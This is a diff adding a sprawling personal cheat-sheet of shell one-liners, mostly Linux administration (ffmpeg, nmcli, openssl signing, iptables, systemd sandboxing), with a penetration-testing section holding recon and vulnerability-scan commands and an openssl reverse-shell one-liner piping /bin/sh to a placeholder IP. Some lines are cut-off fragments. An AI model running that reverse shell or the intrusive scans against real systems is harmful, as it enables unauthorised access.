@@ -1,0 +1,1524 @@
+
+
+
+
+
+
+Pull out hyperlinks from within a webpage:
+
+grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
+
+
+Output it to a file:
+
+cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
+`for url in $(cat list.txt); do host $url; done
+
+
+
+
+
+
+
+
+
+
+Generate Random Pass Ubuntu
+
+date +%s | sha256sum | base64 | head -c 24 ; echo "@%&";
+date +%s | sha1sum | base64 | head -c 12; echo "@%&";
+
+	
+Convert Imagick
+
+for i in *.png; do convert "$i" "${i%.png}.jpg" && rm "$i" && echo "$i is converted."; done
+for i in .png; do convert "$i" "${i%.}.jpg" ; done
+
+
+
+
+
+Record Screen Ubuntu
+
+ffmpeg -v warning -an -video_size 1366x768 -framerate 5 -f x11grab -i :0.0 myvid_$(date +%s).mp4*
+ffmpeg -v warning -video_size 1920x1080 -framerate 5 -f x11grab -i :0.0 myvid_$(date +%s).mov
+ffmpeg -f x11grab -follow_mouse centered -show_region 1 -framerate 5 -video_size 4cif -i :0.0 xmvid_$(date +%s).mov
+
+
+
+
+# Capture video of a linux desktop
+
+ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq /tmp/out.mpg
+
+
+
+
+Split audio file in 1 sec pieces FFMPEG
+
+ffmpeg -i in.wav -map 0 -f segment -segment_time 1 -af "volume=6dB,equalizer=f=40:width_type=o:width=2:g=-7,areverse" -y dir/out%03d.wav
+
+
+
+Cut Video
+
+ffmpeg -i movie.mp4 -ss 00:00:03 -t 00:00:08 -async 1 cut.mp4
+
+
+
+
+# output your microphone to a remote computer's speaker
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+
+
+
+Timestamp
+
+date +%s > 1552925792
+
+
+TIMESTAMP=`date +%s`
+
+
+
+REFERENCE=`git rev-parse HEAD`
+
+
+
+# Use `curl -I 'https://download.mozilla.org/?product=firefox-latest&os=linux64&lang=en_US'` 
+
+
+##   [?] Determine the latest stable version, 
+##       and replace the tag in the URL below.
+
+
+
+
+
+ip=$(curl -s https://checkip.amazonaws.com)
+
+
+
+
+Available interfaces are:
++--------------------+
+$(ip -br a | awk '{print $1}')
++--------------------+
+
+
+
+
+echo -e "
++--------------------------------------------+
+${BWhite}Server subnet = ${BRed}$server_subnet${Color_Off}
+${BWhite}Server port = ${BRed}$listen_port${Color_Off}
+${BWhite}Server public address = ${BRed}$server_public_address${Color_Off}
+${BWhite}WAN Interface = ${BRed}$local_interface${Color_Off}
++--------------------------------------------+
+"
+
+read -r -p "WireGuard Interface: " wg_serv_iface
+
+
+\
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$(echo -n $2 | sha256sum | cut -c1-6)
+
+read -p "(press enter to continue)"
+
+
+
+
+SIGNED_SHA256SUM_BASE64=`mktemp /tmp/ruleset-signature.sha256.base64.XXXXXXXX`
+
+
+
+SIGNED_SHA256SUM=`mktemp /tmp/ruleset-signature.sha256.XXXXXXXX`
+
+
+
+echo $2 | xxd -r -p | openssl pkeyutl -sign -inkey $1 -pkeyopt digest:sha256 -pkeyopt rsa_padding_mode:pss -pkeyopt rsa_pss_saltlen:32 -out $SIGNED_SHA256SUM
+
+cat $SIGNED_SHA256SUM | base64
+cat $SIGNED_SHA256SUM | base64 | qrencode -o $SIGNED_SHA256SUM_BASE64_QR
+
+
+
+eog $SIGNED_SHA256SUM_BASE64_QR 2>/dev/null
+
+
+
+echo 'Hash for signing: '
+
+sha256sum $2/default.rulesets.$TIMESTAMP.gz | cut -f1 -d' '
+
+
+$(sha256sum $2/default.rulesets.$TIMESTAMP.gz | cut -f1 -d' ' | tr -d '\n' | sha256sum | cut -c1-6)
+
+
+
+echo 'Paste in the data from the QR code, then type Ctrl-D:'
+cat | tr -d '\n' > $SIGNED_SHA256SUM_BASE64
+
+
+base64 -d $SIGNED_SHA256SUM_BASE64 > $2/rulesets-signature.$TIMESTAMP.sha256
+openssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -verify $1 -signature $2/rulesets-signature.$TIMESTAMP.sha256 $2/default.rulesets.$TIMESTAMP.gz
+
+
+
+
+openssl dgst -sha256 -sigopt rsa_padding_mode:pss -sigopt rsa_pss_saltlen:32 -sign $1 -out $2/rulesets-signature.$TIMESTAMP.sha256 $2/default.rulesets.$TIMESTAMP.gz
+
+
+
+
+
+
+
+
+#verifyrecover using openssl
+			openssl pkeyutl -verifyrecover -in $file_to_verify -inkey ~/.ssh/$verifying_key_file > $file_to_verify.recovered 
+			
+			
+						#sign using openssl
+			openssl pkeyutl -sign -in access -inkey ~/.ssh/$signing_key_file -out access.signed
+			
+			
+						read -p "Press [Enter] to return to menu"
+			
+			
+			
+			#decrypt using openssl
+			openssl pkeyutl -decrypt -in $file_to_decrypt -out $file_to_decrypt.decrypted -inkey ~/.ssh/$decryption_key_file
+			echo ""
+			
+			
+			#encrypt using openssl
+			openssl pkeyutl -encrypt -pubin -in $file_to_encrypt -out $file_to_encrypt.encrypted -inkey ~/.ssh/$encryption_key_file
+
+			
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+nmcli interactive editor
+    nmcli connection edit 'Wired connection 2'.
+    Usage is well documented from the editor.
+
+nmcli command line interface
+    nmcli connection modify 'Wired connection 2' setting.property value. See nmcli(1) for usage. For example you can change its IPv4 route metric to 200 using nmcli connection modify 'Wired connection 2' ipv4.route-metric 200 command.
+
+Connection file
+    In /etc/NetworkManager/system-connections/, modify the corresponding Wired connection 2.nmconnection file .
+    Do not forget to reload the configuration file with nmcli connection reload.
+	
+	
+	
+	
+nmcli examples
+
+
+
+List nearby wifi networks:
+
+nmcli device wifi list
+
+Connect to a wifi network:
+
+nmcli device wifi connect SSID password password
+
+Connect to a hidden network:
+
+nmcli device wifi connect SSID password password hidden yes
+
+Connect to a wifi on the wlan1 wifi interface:
+
+nmcli device wifi connect SSID password password ifname wlan1 profile_name
+
+Disconnect an interface:
+
+nmcli device disconnect ifname eth0
+
+Reconnect an interface marked as disconnected:
+
+nmcli connection up uuid UUID
+
+Get a list of UUIDs:
+
+nmcli connection show
+
+See a list of network devices and their state:
+
+nmcli device
+
+Turn off wifi:
+
+nmcli radio wifi off
+
+	
+	
+	
+
+
+qrencode -t ASCIIi /etc/wireguard/${A_NAME}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Update twitter via curl
+
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
+
+
+
+
+# Mount folder/filesystem through SSH
+
+sshfs name@server:/path/to/folder /path/to/mount/point
+
+
+
+
+# Compare a remote file with a local file
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+# Download an entire website
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+
+
+
+
+##-==========================================-##
+##  [+] Clone a website to the local system.
+##-==========================================-##
+wget -r -nH $URL
+
+
+
+
+
+
+Mirroring a web site with wget –spider
+
+
+
+
+
+
+wget --no-cache --no-cookies --max-redirect=0 --timeout=20 -O
+
+
+
+
+
+
+
+
+
+Scrape Images from 4chan Using Wget
+wget -P pictures -nd -r -l 1 -H -D i.4cdn.org -A png,gif,jpg,jpeg,webm [thread-url]
+
+
+
+Scrape Images from 8chan Using Wget
+
+wget -P pictures -nd -r -l 1 -H -D media.8ch.net -A png,gif,jpg,jpeg,webm [thread-url]
+
+
+
+
+
+apt-key adv --keyserver $KEYSERVER --recv-key $GPGKEY
+
+
+
+
+
+
+
+for i in $GPGKEY; do apt-key list
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Generate a random number
+NUM=$(cat /dev/urandom | head -n 10 | cksum | awk -F ' ' '{print $1}')
+
+
+
+##-=============================================-##
+##  [+] Shutdown a Windows machine from Linux
+
+net rpc shutdown -I ipAddressOfWindowsPC -U username%password
+
+
+
+
+##-==========================================-##
+##  [+] A very simple and useful stopwatch
+
+time read (ctrl-d to stop)
+
+
+##-=======================================----===-##
+##  [+] Put a console clock in top right corner
+
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+
+
+
+
+
+
+
+
+
+##-=================================================-##
+##  [+] SSH connection through host in the middle
+
+ssh -t reachable_host ssh unreachable_host
+
+
+##-====================================================-##
+##  [+] Check your unread Gmail from the command line
+
+curl -u username --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;'
+
+
+##-==============================================-##
+##  [+] Display the top ten running processes 
+##   (Sorted by memory usage)
+ps aux | sort -nk +4 | tail
+
+
+
+##-===========================================-##
+##  [+] List of commands you use most often
+
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
+
+
+##-=================================================-##
+##  [+] Close shell keeping all subprocess running
+disown -a && exit
+
+
+
+
+##-=================================================-##
+##  [+] Sharing file through http 80 port
+nc -v -l 80 < file.ext
+
+
+
+##-=================================================-##
+##  [+] Matrix Style
+tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"
+
+
+##-===================================-##
+##  [+] Rip audio from a video file.
+
+mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-file>
+
+
+
+##-===============================================-##
+##  [+] Kills a process that is locking a file.
+
+fuser -k filename
+
+
+
+##-====================================-##
+##  [+] save command output to image
+
+ifconfig | convert label:@- ip.png
+
+
+
+##-==============================================-##
+##  [+] Stream YouTube URL directly to mplayer
+
+i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?&video_id=$i" | echo -e $(sed 's/%/\\x/g;s/.*\(v[0-9]\.lscache.*\)/http:\/\/\1/g') | grep -oP '^[^|,]*')
+
+
+
+##-=========================================-##
+##  [+] Graphical tree of sub-directories
+
+ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
+
+
+# Job Control
+^Z $bg $disown
+
+
+##-=================================================-##
+##  [+] intercept stdout/stderr of another process
+
+strace -ff -e trace=write -e write=1,2 -p SOME_PID
+
+
+
+
+
+##-======================================-##
+##  [+] Downloading NoScript extension
+
+curl -L -f -# -O https://addons.mozilla.org/firefox/downloads/latest/noscript/addon-722-latest.xpi
+
+
+
+
+
+
+
+
+
+	do
+		f_iptrule "-D" "${ban_chain} -i ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} src -j ${target_src}"
+		f_iptrule "-D" "${ban_chain} -o ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} dst -j ${target_dst}"
+	done
+
+
+
+f_iptrule "-I" "${wan_input} -p udp --dport 67:68 --sport 67:68 -j RETURN"
+
+f_iptrule "-A" "${wan_input} -j ${ban_chain}"
+
+f_iptrule "-A" "${wan_forward} -j ${ban_chain}"
+
+for dev in ${ban_dev}
+do
+	f_iptrule "${action:-"-A"}" "${ban_chain} -i ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} src -j ${target_src}"
+done
+
+f_iptrule "-I" "${lan_input} -p udp --dport 67:68 --sport 67:68 -j RETURN"
+
+f_iptrule "-A" "${lan_input} -j ${ban_chain}"
+
+f_iptrule "-A" "${lan_forward} -j ${ban_chain}"
+for dev in ${ban_dev}
+do
+	f_iptrule "${action:-"-A"}" "${ban_chain} -o ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} dst -j ${target_dst}"
+done
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ | cut -d: -f2 | cut -d ' ' -f1
+
+
+
+
+tr ',' '\n' | sed 's/^[[:space:]]//g'
+
+ | cut -d "=" -f 2-
+
+
+ | while read pkg; do
+
+ | xargs git add
+  | xargs zcat 
+ 
+ PID=$(pidof -s ${index})
+	if [[ "${PID}" != "" ]]; then
+ 
+ tee -a logfile.txt
+ kill -9 $! 2>/dev/null
+
+
+notify-send "$1" "$2"
+
+
+https://github.com/richb-hanover/OpenWrtScripts
+
+
+
+
+PINGHOST4="1.1.1.1"               # Cloudflare Anycast IPv4 DNS resolver
+PINGHOST6="2606:4700:4700::1111"  # Cloudflare Anycast IPv6 DNS resolver
+
+
+
+# ----- Start the testing -----
+# Print baseline latency for IPv4 & IPv6 (no error if IPv6 not available)
+echo "Testing from $CSN to $H"
+echo "Measuring baseline latency to $PINGHOST4 and $PINGHOST6..."
+fping -D -q -c 5 -4 $PINGHOST4 # ping five times
+fping -D -q -c 5 -6 $PINGHOST6 # ping five times
+
+
+
+# Use nearby anycast addresses for PINGHOST4 and PINGHOST6 to minimize base
+#   latency measurements. Adding 3 msec of bloat to a 15 msec base is a
+#   larger percentage change than 3 msec added onto 50 msec at the -H host
+# See https://blog.cloudflare.com/dns-resolver-1-1-1-1/ for information
+#   about Cloudflare's IPv4 & IPv6 anycast addresses
+
+
+
+
+
+
+
+
+
+
+top -b | head -n 20
+
+
+
+
+
+DHCPDISCOVER
+DHCPOFFER
+DHCPREQUEST
+DHCPACK
+
+Got DHCPv6 request
+DHCPV6 CONFIRM IA_NA from 000100011e0e2bd2001c424f5860
+
+
+
+
+
+
+
+
+
+
+
+
+ping $Domain
+whois $IP
+whois $Domain
+dig $Domain
+nmap -Pn -n -T4 --open -p- $Domain
+nmap -Pn -n -T4 --open -p#,#,# -sCV $Domain
+nmap -Pn -n -T4 --open -sU $Domain
+dirb $Domain
+gobuster dir -u $Domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+joomscan -u $Domain
+nikto -h $Domain -port 443 -Format htm --output $Domain.htm
+uniscan -u $Domain -qweds
+wafw00f $Domain
+whatweb $Domain
+wpscan --url $Domain
+sslscan $Domain
+sslyze $Domain
+
+
+
+
+
+
+
+
+
+
+##-=====================-##
+##  [+] Steganography
+
+steghide extract -sf picture.jpg
+
+steghide info picture.jpg
+
+
+
+##-===================-##
+##  [+] SSL Testing
+
+
+##-==================================================-##
+##  [+] Proxy Enumeration (useful for open proxies)
+##-==================================================-##
+./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
+
+
+
+##-==================================================-##
+##  [+] 
+
+nikto -useproxy http://$ip:3128 -h $ip
+
+
+
+
+
+
+
+
+
+##-==================================================-##
+##  [+] 
+
+
+  if [ $(lsof -nPi | grep -i apache | grep -c ":80 (LISTEN)") -ge 1 ]; then
+    echo '[Success] Apache2 is up and running!'
+  else 
+  
+  
+  
+  
+  
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+##-==================================================-##
+##  [+] 
+
+
+openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>
+
+
+
+
+
+
+##-==========================-##
+##  [+] Harvester - Flags
+##-==========================-##
+theharvester -d $Domain -l $Limit -b $DataSource
+
+
+##-===================================================-##
+##  [+] Harvester Data Source - All Search Engines
+##-===================================================-##
+theharvester -d url -l 500 -b all -b all = all search engines
+
+
+
+##-=======================================-##
+##  [+] Harvester Data Source - Google
+##-=======================================-##
+theharvester -d $Domain -l 500 -b google
+theharvester -d $Domain -b google > google.txt
+
+##-=======================================-##
+##  [+] Harvester Data Source - Twitter
+##-=======================================-##
+theharvester -d $Domain -l 500 -b twitter
+
+
+##-======================================================-##
+##  [+] Use SHODAN database to query discovered hosts
+##-======================================================-##
+theharvester -d $Domain -h > $Domain-SHODAN-Query.txt
+
+
+
+
+
+recon-ng
+[recon-ng][default] > use recon/domains-contacts/whois_pocs
+[recon-ng][default][whois_pocs] > show options
+[recon-ng][default][whois_pocs] > set SOURCE $Domain
+[recon-ng][default][whois_pocs] > run
+
+
+
+##-==================================-##
+##  [+] Search for vulnerabilties:
+
+use recon/domains-vulnerabilities/....
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+##-==========================-##
+##  [+] Basic Recon Query:
+##-==========================-##
+dnsrecon -d “$Domain”
+
+
+
+##-===============================-##
+##  [+] Brute Force Recon Query:
+##-===============================-##
+dnsrecon -d “$Domain” -D “file path” -t std --xml “file” 
+
+
+
+
+metagoofil -d “target domain” -t “file types” -l “# of results” -n “# of downloads” -o “specify directory to save in” -f “specify name and location of file save”
+
+
+
+metagoofil -d owasp.org -t pdf,doc,ppt -l 200 -n 5 -o /root/Desktop/metagoofil/ -f /root/Desktop/metagoofil/result.html
+
+
+
+
+
+metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /root/Desktop/metagoofil/ -f /root/Desktop/metagoofil/result.html
+
+
+
+    Let us understand the details of the command:
+    -d to specify the target domain.
+    -t to specify the file type you want metagoofil to locate and download.
+    -l to limit the results to a search. By default, it is set to 200.
+    -n to specify the number of files to download.
+    -o to specify a directory to save download file.
+    -f output file name and location.
+
+
+
+
+nmap -iL targetlist.txt -sV -sS -T4 -p 1-10000
+
+    "-iL" parameter tells nmap to pull IP's to search from the "targetlist.txt" file
+    "-p" parameter tells nmap to only scan port 80
+    "-sV" is used to try to detect operating system versions on targeted devices
+    "-T4" is the speed in which the scan is conducted, T5 being the fastest T1 being the slowest.
+    "-O" is used for Operating System detection
+
+
+
+Using Fping to Discover Live Hosts
+
+
+
+
+fping -g "target network address w/ cidr notation"
+
+    "-g" is used to generate a target list from the netmask supplied above
+
+
+
+
+
+
+Bash-loop one-liner: (Add an '&' at the end of the line to background each loop to speed it up)
+
+for targets in $(echo x.x.x.{0..255} | tr ' ' '\n'); do ping -c 2 $targets; done
+
+
+##-=======================-##
+##  [+] Email Harvester
+
+theharvester -d $Domain -b google >google.txt
+
+
+##-==================-##
+##  [+] Recon-ng
+##-==================-##
+
+root@kali:~# recon-ng
+[recon-ng][default] > use recon/domains-contacts/whois_pocs
+[recon-ng][default][whois_pocs] > show options
+[recon-ng][default][whois_pocs] > set SOURCE $Domain
+[recon-ng][default][whois_pocs] > run
+
+
+
+Check against subdomains from a list: Create a list.txt full of names.
+
+for ip in $(cat list.txt);do host $ip.website.com;done
+
+
+
+
+##-=====================-##
+##  [+] Zone transfer
+
+root@kali:~# host -l $Domain <dns server address>
+
+##-==================-##
+##  [+] Clean it up:
+
+host -t ns $Domain | cut -d " " -f 4
+
+
+##-==================-##
+##  [+] DNSRecon
+
+dnsrecon -d $Domain -t axfr
+
+
+##-==================-##
+##  [+] DNSEnum
+
+dnsenum $Domain
+
+
+
+DNS Nmap zone transfer
+
+nmap --script=dns-zone-transfer -p 53 ns1.website.com
+
+
+
+
+
+
+
+name of association	URL
+AFRINIC	Http://www.afrinic.net
+APNIC	Http://www.apnic.net
+ARIN	Http://ws.arin.net
+IANA	Http://www.iana.com
+ICANN	Http://www.icann.org
+LACNIC	Http://www.lacnic.net
+NRO	Http://www.nro.net
+RIPE	Http://www.ripe.net
+InterNic	Http://www.internic.net
+
+
+
+
+
+
+theharvester -d $Domain -l 300 -b google -f $Domain.html
+
+
+
+
+theharvester -d microsoft.com -l 500 -b google -h myresults.html
+theharvester -d microsoft.com -b pgp
+theharvester -d microsoft -l 200 -b linkedin
+theharvester -d apple.com -b googleCSE -l 500 -s 300
+
+
+theharvester -d $Domain -l 500 -b google -h $Domain.html
+theharvester -d $Domain -b pgp
+theharvester -d $Domain -l 200 -b linkedin
+theharvester -d $Domain -b googleCSE -l 500 -s 300
+
+$Domain
+
+metagoofil -d sina.com -t pdf -l 200 -o test -f 1.html
+
+metagoofil.py -d apple.com -t doc,pdf -l 200 -n 50 -o applefiles -f results.html
+metagoofil.py -h yes -o applefiles -f results.html (local dir analysis)
+  
+  
+  
+
+
+Query database
+
+query select * from hosts where host like '%example.com%' order by ip_address
+set SOURCE query select host from hosts where host like '%sina.com.cn%' That is, you can execute the data language for query and parameter setting.
+
+Using modules
+
+search google
+返回:
+  Recon
+    recon/domains-hosts/google_site_api
+    recon/domains-hosts/google_site_web
+
+use recon/domains-hosts/google_site_web
+show option         //查看模块选项
+show info           //查看模块详细信息
+set SOURCE sina.com  //设置模块选项
+run                  //执行模块
+
+search report
+use reporting/html
+show option
+set FILENAME  /root/Desktop/example.html
+run
+
+
+
+
+
+Port Scanning
+
+nc connect/tcp scanning:
+
+root@kali:~# nc -nvv -w 1 -z <ip> <port-range>
+
+nc udp scanning
+
+root@kali:~# nc -nv -u -z -w 1 <ip> <port-range>
+
+
+
+
+
+
+
+NMAP
+
+Ping scan and output to a grepable file
+
+root@kali:~# nmap -sn -oG <filename.txt> <ip or range>
+
+Cleanup results:
+
+root@kali:~# grep Up <filename.txt> | cut -d " " -f 2 > <final-filename.txt>
+
+Perform a quick service discovery on a list of IPs and output to another list against top 10 ports
+
+root@kali:~# nmap -v -sV --top-ports=10 -iL <inputfilename.txt> -oG <outputfilename.txt>
+
+
+
+Quick web sweep:
+
+root@kali:~# nmap -p 80 <iprange>
+
+
+
+
+Sometimes if a host is UP but reports down. Add --disable-arp-ping:
+
+nmap -v -p 445 --script=smb-vuln-* --script-args=unsafe-1 <ip> **--disable-arp-ping**
+
+
+
+SMB Enumeration
+
+Check for smb vuln:
+
+nmap -v -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 -iL <filename.txt>
+
+
+
+
+
+btscan (NetBIOS scanner)
+
+nbtscan -f <filename.txt>
+nbtscan -r <ip/cidr>
+
+
+
+Enum4linux bash-loop:
+
+for targets in $(cat <filename.txt>); do enum4linux $targets; done
+
+
+
+
+
+
+
+0x04 HTTPS vulnerability scan
+
+
+openssl
+
+openssl s_client connect www.baidu.com:443
+
+
+openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.baidu.com:443
+
+
+
+
+sslscan
+
+Automatically identify ssl configuration errors, expired protocols, outdated cipher suite, default check crime, heartbleed vulnerability, green for security, red, yellow to draw attention
+
+
+
+sslscan --tlsall www.baidu.com:443
+
+
+sslscan --show-certificate --no-ciphersuites www.baidu.com
+
+
+
+sslyze
+
+Check the ssl outdated version, check the cipher suite with weak points, scan the multi-site, support reading from the file, check whether support for callback recovery
+
+sslyze --regular www.baidu.com:443
+
+
+
+
+nmap --script=ssl-enum-ciphers.nse www.baidu.com
+
+
+
+
+
+Online inquiry 
+
+https://www.ssllabs.com/ssltest
+
+
+
+
+
+# Start socat
+if [ -z "${ALLOWED_RANGE}" ]; then
+	socat TCP-L:5000,fork,reuseaddr SOCKS4A:127.0.0.1:${TOR_SITE}:${TOR_SITE_PORT},socksport=9050
+else
+	socat TCP-L:5000,fork,reuseaddr,range=${ALLOWED_RANGE} SOCKS4A:127.0.0.1:${TOR_SITE}:${TOR_SITE_PORT},socksport=9050
+fi
+
+
+
+docker run -d -p 80:5000 -e "ALLOWED_RANGE=10.0.0.0/8" -e "TOR_SITE=<target_site.onion>" -e "TOR_SITE_PORT=<target_site_port>" --name socator arno0x0x/socator
+
+To start the image in foreground:
+
+docker run -ti -p 80:5000 -e "TOR_SITE=<target_site.onion>" -e "TOR_SITE_PORT=<target_site_port>" --name socator arno0x0x/socator
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/etc/init.d/iptables status
+
+
+
+iptables -L -n | grep -i ${shadowsocksport
+
+
+
+iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport ${shadowsocksport} -j ACCEPT
+iptables -I INPUT -m state --state NEW -m udp -p udp --dport ${shadowsocksport} -j ACCEPT
+/etc/init.d/iptables save
+/etc/init.d/iptables restart
+
+
+
+
+
+
+systemctl status firewalld
+
+firewall-cmd --permanent --zone=public --add-port=${shadowsocksport}/tcp
+firewall-cmd --permanent --zone=public --add-port=${shadowsocksport}/udp
+firewall-cmd --reload
+
+
+
+
+ CHEF-KOCH-WireGuard-Config
+
+
+
+
+brctl show
+ip link show $TUNFISH_BRIDGE_DEVICE
+#brctl showstp $TUNFISH_BRIDGE_DEVICE | grep flags
+
+brctl addif $TUNFISH_BRIDGE_DEVICE $link
+        ethtool -K $link tx off >>/dev/null 2>&1
+
+# Turn on STP
+echo -e "INFO:  Turning on Spanning Tree Protocol (STP)"
+brctl stp $TUNFISH_BRIDGE_DEVICE on
+
+
+
+# Adjust forward delay to improve recovery speed. Default: 15.0
+echo -e "INFO:  Adjusting forward delay to improve recovery speed"
+brctl setfd $TUNFISH_BRIDGE_DEVICE $TUNFISH_BRIDGE_FORWARD_DELAY
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+dumpe2fs -h /dev/sda1 | grep -i 'mount count'
+
+tune2fs -c 20 /dev/sda1
+
+
+fsck.mode=force
+
+
+
+
+
+
+
+
+earlyprintk=vga,keep			## prints kernel messages very early in the boot process, in case the kernel would crash before output is shown. You must change vga to efi for EFI systems
+log_buf_len=16M					## allocates a larger (16MB) kernel message buffer, to ensure that debug output is not overwritten
+	
+bootmem_debug
+
+
+
+
+	
+	
+slub_debug=P					## Allow allocator validation checking to be enabled
+
+page_poison=1					## Wipe higher-level memory allocations when they are freed (needs "page_poison=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+# List of GPG keys required for building grsecurity-patched kernel.
+grsecurity_build_gpg_keys:
+  - name: Greg Kroah-Hartman GPG key (Linux stable release signing key)
+    fingerprint: 647F28654894E3BD457199BE38DBBDC86092693E
+  - name: kernel.org checksum autosigner GPG key
+    fingerprint: B8868C80BA62A1FFFAF5FDA9632D3A06589DA6B1
+  - name: Bradley Spengler GPG key (grsecurity maintainer key)
+    fingerprint: DE9452CE46F42094907F108B44D1C0F82525FE49
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+ournalctl -u ip-accounting-test -n 1 -o verbose	
+	
+	
+	
+journalctl -u ip-accounting-test MESSAGE_ID=ae8f7b866b0347b9af31fe1c80b127c0
+
+systemd-run -p IPAccounting=yes --wait wget https://cfp.all-systems-go.io/en/ASG2017/public/schedule/2.pdf
+
+
+systemd-run -p IPAddressDeny=any -p IPAddressAllow=8.8.8.8 -p IPAddressAllow=127.0.0.0/8 -t /bin/sh
+
+systemctl set-property system.slice IPAddressDeny=any IPAddressAllow=localhost
+# systemctl set-property apache.service IPAddressAllow=10.0.0.0/8
+
+
+systemd-resolve 
+
+
+systemd-run --pipe -p IPAddressDeny=any -p IPAddressAllow=85.214.157.71 -p IPAddressAllow=2a01:238:43ed:c300:10c3:bcf3:3266:da74 -p DynamicUser=yes curl http://0pointer.de/public/casync-kinvolk2017.pdf | lp
+
+
+systemd-run --pipe -p IPAddressDeny=any \
+                     -p IPAddressAllow=85.214.157.71 \
+                     -p IPAddressAllow=2a01:238:43ed:c300:10c3:bcf3:3266:da74 \
+                     -p DynamicUser=yes \
+                     curl http://0pointer.de/public/casync-kinvolk2017.pdf | lp
+
+
+
+
+# systemd-nspawn -L system_u:object_r:svirt_sandbox_file_t:s0:c0,c1 -Z system_u:system_r:svirt_lxc_net_t:s0:c0,c1 -D /srv/container /bin/sh
+
+
+
+
+systemd-run --pty --property=DynamicUser=yes --property=StateDirectory=wuff /bin/sh
+
+systemd-run --pty --property=DynamicUser=yes --property=StateDirectory=wuff /bin/sh
+
+
+# systemd-nspawn -bi foobar.raw
+
+
+qemu-kvm -m 512 -smp 2 -bios /usr/share/edk2/ovmf/OVMF_CODE.fd -drive format=raw,file=foobar.raw
+
+
+
+
+
+
+--property=
+systemctl set-property.
+
+
+
+
+--overlay=, --overlay-ro=
+
+
+--capability=
+
+    List one or more additional capabilities to grant the container. Takes a comma-separated list of capability names, see capabilities(7) for more information. Note that the following capabilities will be granted in any way: CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_DAC_READ_SEARCH, CAP_FOWNER, CAP_FSETID, CAP_IPC_OWNER, CAP_KILL, CAP_LEASE, CAP_LINUX_IMMUTABLE, CAP_NET_BIND_SERVICE, CAP_NET_BROADCAST, CAP_NET_RAW, CAP_SETGID, CAP_SETFCAP, CAP_SETPCAP, CAP_SETUID, CAP_SYS_ADMIN, CAP_SYS_CHROOT, CAP_SYS_NICE, CAP_SYS_PTRACE, CAP_SYS_TTY_CONFIG, CAP_SYS_RESOURCE, CAP_SYS_BOOT, CAP_AUDIT_WRITE, CAP_AUDIT_CONTROL. Also CAP_NET_ADMIN is retained if --private-network is specified. If the special value "all" is passed, all capabilities are retained.
+--drop-capability=
+
+
+
+--network-veth or --network-bridge=
+
+
+--network-ipvlan=
+
+
+--network-ipvlan= implies --private-network.
+--private-users=
+
+
+
+
+
+systemd-debug-generator is a generator that reads the kernel command line and understands three options:
+
+If the systemd.mask= option is specified and followed by a unit name, this unit is masked for the runtime, similar to the effect of systemctl(1)'s mask command. This is useful to boot with certain units removed from the initial boot transaction for debugging system startup. May be specified more than once.
+
+If the systemd.wants= option is specified and followed by a unit name, a start job for this unit is added to the initial transaction. This is useful to start one or more additional units at boot. May be specified more than once.
+
+If the systemd.debug-shell option is specified, the debug shell service "debug-shell.service" 
+
+
+
+dir=$(mktemp -d)
+SYSTEMD_LOG_LEVEL=debug /usr/lib/systemd/system-generators/systemd-fstab-generator \
+        "$dir" "$dir" "$dir"
+find $dir
+
+
+
+
+
+--dump-configuration-items
+--show-status=
+
+
+
+
+
+password=$(oathtool --totp --base32 $secret_key)
+
+ else
+      password=$(ykman oath code $LAZY_CONNECT_TOTP_QUERY 2>/dev/null | awk '{print $2}')
+    fi
+
+
+echo -n "$password" | pbcopy
+
+
+
+
+  List connected YubiKeys, only output serial number:
+    $ ykman list --serials
+
